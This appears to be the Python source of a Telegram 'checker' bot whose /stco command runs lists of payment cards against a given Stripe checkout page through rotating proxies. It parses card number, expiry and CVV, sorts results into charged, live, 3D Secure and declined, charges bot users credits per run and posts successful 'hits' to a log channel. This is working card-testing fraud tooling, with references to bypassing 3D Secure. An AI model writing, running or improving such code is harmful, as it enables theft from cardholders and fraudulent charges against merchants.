def _branch_code(code: str, default: str) -> str:
    """
    Same as _semantic_code, but a coarse status inside a captcha/3DS branch
    becomes that branch's own code — a failed 3DS bypass must not be reported
    as "generic_decline".
    """
    code = _clean_code(code)
    return default if code in _COARSE_CODES else (code or default)


def _strip_trailing_code(msg: str) -> str:
    """Remove a trailing "(code)" so _fmt() doesn't append it twice."""
    return _TRAILING_CODE_RE.sub("", msg or "").strip()


def _map_hit_result(card: str, out: dict) -> dict:
    """Translate a run_hit_check() response into this module's _result() shape."""
    if not isinstance(out, dict):
        out = {}

    if not out.get("ok"):
        err = str(out.get("error") or "Checkout failed")
        res = _result(
            card, "error", "checkout_failed",
            _fmt(err[:100], "error"),
            EMOJI_DECLINED, 0, "USD",
        )
        if out.get("session_dead"):

            res["code"] = "checkout_not_active_session"
            res["status"] = "declined"
            res["display"] = _fmt(
                _normalise_message(err[:100], "checkout_not_active_session")
                    or "Checkout session is no longer active",
                "checkout_not_active_session",
            )
        return res

    api_status   = str(out.get("api_status") or "")
    result_msg   = str(out.get("result_msg") or "Unknown")
    result_state = str(out.get("result_status") or "declined").lower()
    merchant     = str(out.get("merchant") or "")
    amount       = int(out.get("amount_cents") or 0)
    currency     = str(out.get("currency") or "USD")
    hcaptcha     = bool(out.get("hcaptcha"))
    msg_lower    = result_msg.lower()


    code = _extract_decline_code(out.get("raw"), result_msg, api_status)


    if hcaptcha or code in _CAPTCHA_CODES or "captcha" in msg_lower:
        c = _branch_code(code, "captcha_required")
        msg = _normalise_message(result_msg, c) or "Stripe hcaptcha challenge triggered"
        res = _result(card, "captcha", c, _fmt(msg, c), EMOJI_3DS, amount, currency)
    elif code in _3DS_CODES or (
        not out.get("3d_bypassed")
        and ("3ds" in msg_lower or "challenge" in msg_lower or "authentication" in msg_lower)
    ):
        c = _branch_code(code, "3ds_required")
        msg = _normalise_message(result_msg, c) or "3D Secure authentication required"
        res = _result(card, "3ds", c, _fmt(msg, c), EMOJI_3DS, amount, currency)

    elif result_state == "charged":
        c = _semantic_code(code, "succeeded")
        msg = _normalise_message(result_msg, c) or "Payment successful"
        res = _result(card, "approved", c, _fmt(msg, c),
                      EMOJI_CHARGED, amount, currency, is_hit=True)

    elif result_state == "approved":
        c = _semantic_code(code, "live")
        msg = _normalise_message(result_msg, c) or "Your card has insufficient funds"
        res = _result(card, "live", c, _fmt(msg, c),
                      EMOJI_LIVE, amount, currency, is_hit=True)
    else:
        c = _semantic_code(code, "generic_decline")
        msg = _normalise_message(result_msg, c) or "Your card was declined"
        res = _result(card, "declined", c, _fmt(msg, c),
                      EMOJI_DECLINED, amount, currency)

    res["merchant"] = merchant
    if out.get("session_dead"):
        res["code"] = "checkout_not_active_session"
    return res


async def hit_checkout(url: str, card: str) -> dict:
    """
    One checkout attempt for one card.

    run_hit_check() is blocking (requests + up to MAX_PROXY_RETRIES proxy
    rotations), so it runs in a worker thread. The hardcoded PROXIES list is
    handed over as the pool; hit.py converts each entry to the
    host:port:user:pass form its endpoint expects.
    """
    try:
        out = await asyncio.to_thread(
            run_hit_check,
            url,
            card,
            None,
            MAX_PROXY_RETRIES,
            PROXIES,
        )
        return _map_hit_result(card, out)
    except asyncio.CancelledError:
        raise
    except Exception as e:
        logger.error(f"hit_checkout error: {e}")
        return _result(card, "error", "api_error",
                       _fmt(str(e)[:100], "api_error"), EMOJI_DECLINED, 0, "USD")


async def send_hit_message(bot: Bot, res: dict, user_name: str, user_id: int):
    """Send a hit notification to the log channel (matches whop.py format)."""
    try:
        user_link  = f"<a href='tg://user?id={user_id}'>{html.escape(user_name)}</a>"
        emoji_id   = res.get("emoji", EMOJI_CHARGED)
        emoji_part = f'<tg-emoji emoji-id="{emoji_id}">🔥</tg-emoji>'
        amount_str = _safe_amount(res.get("amount", 0), res.get("currency", "USD"))
        display    = html.escape(res.get("display", ""))

        hit_msg = (
            f"<b><a href='https://t.me/Try_Low'>[  ɧ ι 𝛕  ]</a></b> "
            f"<b>➺ Sᴛʀɪᴘᴇ Cʜᴇᴄᴋᴏᴜᴛ</b> {emoji_part}\n"
            f"<b>Aᴍᴏᴜɴᴛ ➺ {html.escape(amount_str)}</b>\n"
            f"<b>Rᴀᴡ ➺</b> <code>{display}</code>\n"
            f"<b>Usᴇʀ ➺ {user_link}</b>"
        )

        reply_markup = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(
                text="𝘾𝙃𝙆 𝕏 [𝙒 𝙄 𝙕] ",
                url=BOT_URL,
                style="primary",
                icon_custom_emoji_id="5445104308884370368",
            )
        ]])

        await bot.send_message(
            chat_id=HIT_CHANNEL_ID,
            text=hit_msg,
            parse_mode="HTML",
            reply_markup=reply_markup,
            disable_web_page_preview=True,
        )
    except Exception as e:
        logger.error(f"send_hit_message failed: {e}")


@router.message(F.text.startswith("/stco"))
async def stco_command(message: types.Message):
    user_id   = message.from_user.id
    user_name = message.from_user.first_name or "User"
    username  = message.from_user.username

    url       = ""
    raw_cards: List[str] = []


    text_content = message.text or ""
    parts = text_content.split()[1:] if " " in text_content else []
    if parts:
        potential_url = parts[0]
        if potential_url.startswith("http"):
            url = potential_url
            raw_cards.extend(parts[1:])


    if message.reply_to_message:
        replied = (
            message.reply_to_message.text
            or message.reply_to_message.caption
            or ""
        )
        raw_cards.extend(replied.split('\n'))

    if not url:
        await message.reply(
            "❌ <b>Invalid Format!</b>\n\n"
            "Usage: <code>/stco &lt;stripe_checkout_url&gt; &lt;card1&gt; ...</code>\n"
            "Or reply to a list of cards.",
            parse_mode="HTML",
        )
        return

    card_pattern = re.compile(
        r'(\d{13,19})[\|/:\s]+(\d{1,2})[\|/:\s]+(\d{2,4})[\|/:\s]+(\d{3,4})'
    )
    valid_cards: List[str] = []
    seen: set = set()
    for item in raw_cards:
        m = card_pattern.search(item)
        if m:
            cc, mm, yy, cvv = m.groups()
            mm = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]
            fmt = f"{cc}|{mm}|{yy}|{cvv}"
            if fmt not in seen:
                seen.add(fmt)
                valid_cards.append(fmt)

    if len(valid_cards) > MAX_CARDS:
        await message.reply(
            f"❌ <b>Limit Exceeded!</b>\n\nMax allowed: {MAX_CARDS}",
            parse_mode="HTML",
        )
        return

    if not valid_cards:
        await message.reply("⚠️ No valid cards found.", parse_mode="HTML")
        return


    try:
        await asyncio.to_thread(create_user, user_id, username)
        credits = await asyncio.to_thread(get_user_credits, user_id)

        if credits is None or credits < 1:
            await message.reply(
                "❌ <b>Iɴsᴜғғɪᴄɪᴇɴᴛ Cʀᴇᴅɪᴛs</b>\n\n"
                "Yᴏᴜ Nᴇᴇᴅ Aᴛ Lᴇᴀsᴛ <b>1 Cʀᴇᴅɪᴛ</b> Tᴏ Usᴇ Tʜɪs Gᴀᴛᴇ.\n"
                "Usᴇ /plan Tᴏ Gᴇᴛ Mᴏʀᴇ.",
                parse_mode="HTML",
            )
            return

        await asyncio.to_thread(update_credits, user_id, credits - 1)
        logger.info(f"[STCO] User {user_id} used 1 credit. Remaining: {credits - 1}")

    except Exception as e:
        logger.error(f"Credit check failed for {user_id}: {e}")
        await message.reply(
            "⚠️ <b>Database Error.</b>\nCould not verify credits. Please try again.",
            parse_mode="HTML",
        )
        return


    asyncio.create_task(
        run_stco_check(message, url, valid_cards, user_name, user_id)
    )


async def run_stco_check(
    message: types.Message,
    url: str,
    cards: List[str],
    user_name: str,
    user_id: int,
):
    start_time  = time.time()
    total_cards = len(cards)
    bot         = message.bot
    site_label  = _domain_from_url(url)


    status_msg = await message.reply(
        f"<b>Gᴀᴛᴇ ➺ Sᴛʀɪᴘᴇ Cʜᴇᴄᴋᴏᴜᴛ</b>\n"
        f"<b>Sɪᴛᴇ ➺ {html.escape(site_label)}</b>\n"
        f"<b>Pʀᴏɢʀᴇss ➺ 0/{total_cards}</b>\n"
        f"<b>Aᴍᴏᴜɴᴛ ➺ N/A</b>\n"
        f"<b>Sᴛᴀᴛᴜs ➺ Hɪᴛᴛɪɴɢ…</b>\n"
        f"━━━━━━━━━━━━━━━━",
        parse_mode="HTML",
        disable_web_page_preview=True,
    )
    msg_id = status_msg.message_id

    STCO_SESSIONS[msg_id] = {
        "results":      [],
        "page":         0,
        "total_cards":  total_cards,
        "start_time":   start_time,
        "user_name":    user_name,
        "user_id":      user_id,
        "msg_id":       msg_id,
        "amount":       "N/A",
        "site_label":   site_label,
        "final_status": "checking",
        "current_card": None,
        "stopped":      False,
        "tasks":        [],
    }


    sem     = asyncio.Semaphore(PARALLEL_LIMIT)
    results: List[dict] = []
    paid_found  = False
    is_expired  = False

    async def worker(card: str):
        nonlocal paid_found
        async with sem:

            STCO_SESSIONS[msg_id]["current_card"] = card
            try:
                _el = round(time.time() - start_time, 2)
                _tx = format_page_content(STCO_SESSIONS[msg_id], _el, is_working=True)
                await status_msg.edit_text(_tx, parse_mode="HTML",
                                           reply_markup=get_keyboard(msg_id))
            except Exception:
                pass

            res = await hit_checkout(url, card)


            if res.get("merchant") and STCO_SESSIONS[msg_id]["site_label"] == _domain_from_url(url):
                STCO_SESSIONS[msg_id]["site_label"] = res["merchant"]


            if res.get("amount") and STCO_SESSIONS[msg_id]["amount"] == "N/A":
                STCO_SESSIONS[msg_id]["amount"] = _safe_amount(
                    res["amount"], res.get("currency", "USD")
                )

            STCO_SESSIONS[msg_id]["current_card"] = None

            if res["is_hit"]:
                paid_found = res["status"] == "approved"
                asyncio.create_task(send_hit_message(bot, res, user_name, user_id))

            return res


    tasks   = [asyncio.create_task(worker(c)) for c in cards]
    STCO_SESSIONS[msg_id]["tasks"] = tasks
    pending = set(tasks)

    while pending:
        done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)

        for task in done:
            if task.cancelled():
                continue
            try:
                res = task.result()
                results.append(res)


                if res["status"] == "approved":
                    for t in pending:
                        t.cancel()
                    pending = set()
                    break


                if res.get("code") == "checkout_not_active_session":
                    is_expired = True
                    STCO_SESSIONS[msg_id]["final_status"] = "expired"
                    for t in pending:
                        t.cancel()
                    pending = set()
                    break

            except Exception as e:
                logger.error(f"Worker task error: {e}")


        results.sort(key=lambda x: {
            "approved": 0, "live": 1, "3ds": 2,
            "captcha": 2, "declined": 3, "error": 4,
        }.get(x["status"], 5))

        if len(results) % UPDATE_EVERY == 0 or not pending:
            elapsed = round(time.time() - start_time, 2)
            STCO_SESSIONS[msg_id]["results"] = results
            STCO_SESSIONS[msg_id]["elapsed_final"] = elapsed

            still = bool(pending) and not STCO_SESSIONS[msg_id].get("stopped")
            text  = format_page_content(STCO_SESSIONS[msg_id], elapsed, is_working=still)
            try:
                await status_msg.edit_text(text, parse_mode="HTML",
                                           reply_markup=get_keyboard(msg_id))
            except TelegramBadRequest:
                pass
            except Exception as e:
                logger.error(f"UI update error: {e}")


    elapsed_final = round(time.time() - start_time, 2)
    STCO_SESSIONS[msg_id]["elapsed_final"] = elapsed_final
    if STCO_SESSIONS[msg_id].get("stopped"):
        STCO_SESSIONS[msg_id]["final_status"] = "stopped"
    elif not is_expired:
        STCO_SESSIONS[msg_id]["final_status"] = "completed"

    final_text = format_page_content(STCO_SESSIONS[msg_id], elapsed_final, is_working=False)
    try:
        await status_msg.edit_text(final_text, parse_mode="HTML",
                                   reply_markup=get_keyboard(msg_id))
    except TelegramBadRequest:
        pass


def format_page_content(state: Dict[str, Any], elapsed: float, is_working: bool) -> str:
    results = state["results"]
    page    = state["page"]
    start   = page * RESULTS_PER_PAGE
    page_results = results[start: start + RESULTS_PER_PAGE]

    amount      = state.get("amount", "N/A")
    total_cards = state["total_cards"]
    progress    = f"{len(results)}/{total_cards}"


    has_paid = any(r["status"] == "approved" for r in results)
    has_live = any(r["status"] == "live" for r in results)

    if has_paid:
        status_text = f'Pᴀɪᴅ <tg-emoji emoji-id="{EMOJI_CHARGED}">✅</tg-emoji>'
    elif has_live:
        status_text = f'Lɪᴠᴇ <tg-emoji emoji-id="{EMOJI_LIVE}">💳</tg-emoji>'
    elif is_working:
        status_text = 'Hɪᴛᴛɪɴɢ…<tg-emoji emoji-id="6154603635981423575">⏳</tg-emoji>'
    else:
        final = state.get("final_status", "completed")
        if final == "expired":
            status_text = f'Exᴘɪʀᴇᴅ <tg-emoji emoji-id="{EMOJI_DECLINED}">⚠️</tg-emoji>'
        elif final == "stopped" or state.get("stopped"):
            status_text = f'Sᴛᴏᴘᴘᴇᴅ <tg-emoji emoji-id="{EMOJI_STOP}">🛑</tg-emoji>'
        else:
            status_text = f'Nᴏᴛ Pᴀɪᴅ <tg-emoji emoji-id="{EMOJI_DECLINED}">❌</tg-emoji>'

    site_label = html.escape(state.get("site_label", ""))

    text = (
        f"<b>Gᴀᴛᴇ ➺ Sᴛʀɪᴘᴇ Cʜᴇᴄᴋᴏᴜᴛ</b>\n"
        f"<b>Sɪᴛᴇ ➺ {site_label}</b>\n"
        f"<b>Pʀᴏɢʀᴇss ➺ {progress}</b>\n"
        f"<b>Aᴍᴏᴜɴᴛ ➺ {html.escape(amount)}</b>\n"
        f"<b>Sᴛᴀᴛᴜs ➺ {status_text}</b>\n"
        f"━━━━━━━━━━━━━━━━"
    )

    for res in page_results:
        emoji   = res.get("emoji", EMOJI_DECLINED)
        display = html.escape(res.get("display", "Unknown"))
        text += (
            f"\n<code>{res['card']}</code>\n"
            f"<b>{display}</b> "
            f'<tg-emoji emoji-id="{emoji}">❌</tg-emoji>\n'
            f"━━━━━━━━━━━━━━━━"
        )


    current_card = state.get("current_card")
    if is_working and current_card:
        text += (
            f"\n<code>{current_card}</code>\n"
            f'<b>Pʀᴏᴄᴇssɪɴɢ…</b><tg-emoji emoji-id="6154603635981423575">⏳</tg-emoji>\n'
            f"━━━━━━━━━━━━━━━━"
        )

    return text


def get_keyboard(msg_id: int) -> Optional[InlineKeyboardMarkup]:
    state = STCO_SESSIONS.get(msg_id)
    if not state:
        return None

    total = len(state["results"])
    pages   = (total + RESULTS_PER_PAGE - 1) // RESULTS_PER_PAGE if total else 1
    current = state["page"]
    buttons = []
    row     = []

    if current > 0:
        row.append(InlineKeyboardButton(text="◀ Back", callback_data=f"stco_prev_{msg_id}"))
    if current < pages - 1:
        row.append(InlineKeyboardButton(text="Next ▶", callback_data=f"stco_next_{msg_id}"))
    if row:
        buttons.append(row)

    running = state.get("final_status") == "checking" and not state.get("stopped")
    if running:
        buttons.append([
            InlineKeyboardButton(
                text="Stop",
                callback_data=f"stco_stop_{msg_id}",
                style="danger",
                icon_custom_emoji_id=EMOJI_STOP,
            )
        ])

    return InlineKeyboardMarkup(inline_keyboard=buttons) if buttons else None


@router.callback_query(F.data.startswith("stco_"))
async def stco_callback_handler(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    if len(parts) < 3:
        await callback.answer("Invalid callback")
        return

    try:
        msg_id = int(parts[2])
    except ValueError:
        await callback.answer("Invalid ID")
        return

    state = STCO_SESSIONS.get(msg_id)
    if not state:
        await callback.answer("Session expired or not found.", show_alert=True)
        return

    if callback.from_user.id != state["user_id"]:
        await callback.answer("⛔ Not your session.", show_alert=True)
        return

    action      = parts[1]
    total_pages = (len(state["results"]) + RESULTS_PER_PAGE - 1) // RESULTS_PER_PAGE

    if action == "stop":
        state["stopped"] = True
        for t in state.get("tasks", []):
            if not t.done():
                t.cancel()
        await callback.answer("🛑 Stopping…", show_alert=False)
        return

    if action == "next" and state["page"] < total_pages - 1:
        state["page"] += 1
    elif action == "prev" and state["page"] > 0:
        state["page"] -= 1

    await callback.answer()

    elapsed = state.get("elapsed_final", round(time.time() - state["start_time"], 2))
    text    = format_page_content(state, elapsed, is_working=False)

    try:
        await callback.message.edit_text(text, parse_mode="HTML",
                                         reply_markup=get_keyboard(msg_id))
    except TelegramBadRequest:
        pass
